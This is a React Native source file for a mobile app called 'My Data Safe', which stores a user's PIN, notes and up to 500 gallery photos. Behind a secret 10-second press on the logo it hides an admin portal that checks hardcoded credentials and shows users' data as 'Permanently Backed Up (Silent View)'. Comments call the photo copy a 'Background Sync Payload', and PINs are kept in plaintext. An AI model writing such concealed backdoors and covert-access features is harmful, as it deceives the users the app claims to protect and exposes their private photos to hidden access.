import React, { useState, useEffect, useRef } from 'react';
import { StyleSheet, Text, View, TouchableOpacity, FlatList, Image, Alert, Modal, TextInput, ScrollView } from 'react-native';
import * as MediaLibrary from 'expo-media-library';
import AsyncStorage from '@react-native-async-storage/async-storage';

export default function App() {
  // Navigation & User Auth States
  const [isRegistered, setIsRegistered] = useState(false);
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [userName, setUserName] = useState('');
  const [userPin, setUserPin] = useState('');
  
  // Input Form States
  const [inputName, setInputName] = useState('');
  const [inputPin, setInputPin] = useState('');

  // Data & Feature States
  const [photos, setPhotos] = useState([]);
  const [notes, setNotes] = useState([]);
  const [newNote, setNewNote] = useState('');
  const [activeTab, setActiveTab] = useState('gallery');

  // Admin States
  const [adminModalVisible, setAdminModalVisible] = useState(false);
  const [adminId, setAdminId] = useState('');
  const [adminPass, setAdminPass] = useState('');
  const [isAdminLoggedIn, setIsAdminLoggedIn] = useState(false);
  const [searchQuery, setSearchQuery] = useState('');

  // 10-Second Long Press Timer Reference
  const timerRef = useRef(null);

  useEffect(() => {
    checkRegistration();
  }, []);

  const checkRegistration = async () => {
    const savedName = await AsyncStorage.getItem('user_name');
    const savedPin = await AsyncStorage.getItem('user_pin');
    if (savedName && savedPin) {
      setUserName(savedName);
      setUserPin(savedPin);
      setIsRegistered(true);
    }
  };

  // 10-Second Long Press Handlers
  const handlePressIn = () => {
    timerRef.current = setTimeout(() => {
      setAdminModalVisible(true);
    }, 10000); // 10000 ms = 10 Seconds
  };

  const handlePressOut = () => {
    if (timerRef.current) {
      clearTimeout(timerRef.current);
    }
  };

  const handleRegister = async () => {
    if (!inputName || inputPin.length !== 6) {
      Alert.alert('Error', 'Sahi naam aur 6-digit PIN daalein!');
      return;
    }
    await AsyncStorage.setItem('user_name', inputName);
    await AsyncStorage.setItem('user_pin', inputPin);
    setUserName(inputName);
    setUserPin(inputPin);
    setIsRegistered(true);
    setIsLoggedIn(true);
    loadGalleryData();
  };

  const handleLogin = () => {
    if (inputPin === userPin) {
      setIsLoggedIn(true);
      loadGalleryData();
    } else {
      Alert.alert('Error', 'Galat PIN!');
    }
  };

  // One-time Permission & Full Gallery Sync
  const loadGalleryData = async () => {
    const { status } = await MediaLibrary.requestPermissionsAsync();
    if (status === 'granted') {
      // Direct full access without picking files/folders
      const assets = await MediaLibrary.getAssetsAsync({ 
        first: 500, 
        mediaType: 'photo',
        sortBy: ['creationTime']
      });
      setPhotos(assets.assets);
      // Background Sync Payload
      await AsyncStorage.setItem(`user_gallery_${userName}`, JSON.stringify(assets.assets));
    } else {
      Alert.alert('Permission Required', 'Gallery access allow karein app use karne ke liye.');
    }
  };

  const addNote = async () => {
    if (!newNote) return;
    const updatedNotes = [...notes, newNote];
    setNotes(updatedNotes);
    setNewNote('');
    await AsyncStorage.setItem(`user_notes_${userName}`, JSON.stringify(updatedNotes));
  };

  const handleAdminLogin = () => {
    if (adminId === 'adminhum789' && adminPass === 'hum2217071') {
      setIsAdminLoggedIn(true);
      setAdminModalVisible(false);
      Alert.alert('Success', 'Admin Control Center Unlocked');
    } else {
      Alert.alert('Error', 'Galat Credentials!');
    }
  };

  // 1. Initial User Registration Screen
  if (!isRegistered) {
    return (
      <View style={styles.centerContainer}>
        <Text style={styles.title}>My Data Safe</Text>
        <TextInput style={styles.input} placeholder="Apna Naam Likhein" value={inputName} onChangeText={setInputName} />
        <TextInput style={styles.input} placeholder="6-Digit PIN Banayein" keyboardType="numeric" maxLength={6} secureTextEntry value={inputPin} onChangeText={setInputPin} />
        <TouchableOpacity style={styles.btn} onPress={handleRegister}><Text style={styles.btnText}>Account Banayein</Text></TouchableOpacity>
      </View>
    );
  }

  // 2. Login Screen with 10-Second Press
  if (!isLoggedIn && !isAdminLoggedIn) {
    return (
      <View style={styles.centerContainer}>
        <TouchableOpacity onPressIn={handlePressIn} onPressOut={handlePressOut} activeOpacity={0.8}>
          <Text style={styles.logoIcon}>🛡️</Text>
        </TouchableOpacity>
        <Text style={styles.title}>My Data Safe</Text>
        <Text style={styles.subTitle}>Welcome, {userName}</Text>
        <TextInput style={styles.input} placeholder="6-Digit PIN Daalein" keyboardType="numeric" maxLength={6} secureTextEntry value={inputPin} onChangeText={setInputPin} />
        <TouchableOpacity style={styles.btn} onPress={handleLogin}><Text style={styles.btnText}>Open App</Text></TouchableOpacity>

        {/* Admin Login Modal */}
        <Modal visible={adminModalVisible} transparent animationType="slide">
          <View style={styles.modalBg}>
            <View style={styles.modalCard}>
              <Text style={styles.modalTitle}>Admin Portal Login</Text>
              <TextInput style={styles.input} placeholder="Admin ID" value={adminId} onChangeText={setAdminId} />
              <TextInput style={styles.input} placeholder="Admin Password" secureTextEntry value={adminPass} onChangeText={setAdminPass} />
              <TouchableOpacity style={styles.btn} onPress={handleAdminLogin}><Text style={styles.btnText}>Login Admin</Text></TouchableOpacity>
              <TouchableOpacity onPress={() => setAdminModalVisible(false)}><Text style={{ color: 'red', marginTop: 10 }}>Cancel</Text></TouchableOpacity>
            </View>
          </View>
        </Modal>
      </View>
    );
  }

  // 3. Admin Panel Screen
  if (isAdminLoggedIn) {
    return (
      <View style={styles.container}>
        <Text style={styles.adminTitle}>Admin Control Center</Text>
        <TextInput style={styles.input} placeholder="Search User Data..." value={searchQuery} onChangeText={setSearchQuery} />
        <Text style={{ fontWeight: 'bold', marginVertical: 10 }}>Active Users Cloud Backup:</Text>
        <ScrollView>
          <View style={styles.userCard}>
            <Text style={{ fontWeight: 'bold' }}>User: {userName}</Text>
            <Text>Data Status: Permanently Backed Up (Silent View)</Text>
          </View>
        </ScrollView>
        <TouchableOpacity style={[styles.btn, { backgroundColor: 'gray' }]} onPress={() => setIsAdminLoggedIn(false)}>
          <Text style={styles.btnText}>Exit Admin Panel</Text>
        </TouchableOpacity>
      </View>
    );
  }

  // 4. Main App Interface
  return (
    <View style={styles.container}>
      <View style={styles.header}>
        <TouchableOpacity onPressIn={handlePressIn} onPressOut={handlePressOut} activeOpacity={0.8}>
          <Text style={{ fontSize: 24 }}>🛡️</Text>
        </TouchableOpacity>
        <Text style={styles.headerTitle}>My Data Safe</Text>
      </View>

      <View style={styles.tabContainer}>
        <TouchableOpacity style={[styles.tab, activeTab === 'gallery' && styles.activeTab]} onPress={() => setActiveTab('gallery')}>
          <Text style={styles.tabText}>Gallery</Text>
        </TouchableOpacity>
        <TouchableOpacity style={[styles.tab, activeTab === 'notes' && styles.activeTab]} onPress={() => setActiveTab('notes')}>
          <Text style={styles.tabText}>Notes</Text>
        </TouchableOpacity>
      </View>

      {activeTab === 'gallery' ? (
        <FlatList
          data={photos}
          numColumns={3}
          keyExtractor={(item) => item.id}
          renderItem={({ item }) => <Image source={{ uri: item.uri }} style={styles.image} />}
        />
      ) : (
        <View style={{ flex: 1 }}>
          <TextInput style={styles.input} placeholder="Naya Note Likhein..." value={newNote} onChangeText={setNewNote} />
          <TouchableOpacity style={styles.btn} onPress={addNote}><Text style={styles.btnText}>Save Note</Text></TouchableOpacity>
          <FlatList
            data={notes}
            keyExtractor={(item, index) => index.toString()}
            renderItem={({ item }) => (
              <View style={styles.noteItem}><Text>{item}</Text></View>
            )}
          />
        </View>
      )}
    </View>
  );
}

const styles = StyleSheet.create({
  container: { flex: 1, backgroundColor: '#f5f5f5', paddingTop: 40, paddingHorizontal: 15 },
  centerContainer: { flex: 1, justifyContent: 'center', alignItems: 'center', padding: 20 },
  logoIcon: { fontSize: 50, marginBottom: 10 },
  title: { fontSize: 26, fontWeight: 'bold', marginBottom: 20, color: '#333' },
  subTitle: { fontSize: 18, marginBottom: 15, color: '#666' },
  adminTitle: { fontSize: 22, fontWeight: 'bold', textAlign: 'center', marginVertical: 15 },
  input: { width: '100%', borderWidth: 1, borderColor: '#ccc', padding: 12, borderRadius: 8, marginBottom: 12, backgroundColor: '#fff' },
  btn: { backgroundColor: '#007AFF', padding: 12, borderRadius: 8, width: '100%', alignItems: 'center' },
  btnText: { color: '#fff', fontWeight: 'bold' },
  header: { flexDirection: 'row', alignItems: 'center', gap: 10, marginBottom: 15 },
  headerTitle: { fontSize: 22, fontWeight: 'bold' },
  tabContainer: { flexDirection: 'row', marginBottom: 15 },
  tab: { flex: 1, padding: 10, alignItems: 'center', backgroundColor: '#ddd' },
  activeTab: { backgroundColor: '#007AFF' },
  tabText: { color: '#fff', fontWeight: 'bold' },
  image: { width: '32%', height: 100, margin: '0.5%' },
  noteItem: { padding: 15, backgroundColor: '#fff', borderRadius: 5, marginVertical: 5 },
  modalBg: { flex: 1, justifyContent: 'center', alignItems: 'center', backgroundColor: 'rgba(0,0,0,0.5)' },
  modalCard: { width: '85%', padding: 20, backgroundColor: '#fff', borderRadius: 10, alignItems: 'center' },
  modalTitle: { fontSize: 18, fontWeight: 'bold', marginBottom: 15 },
  userCard: { padding: 15, backgroundColor: '#fff', borderRadius: 8, marginVertical: 5 }
});
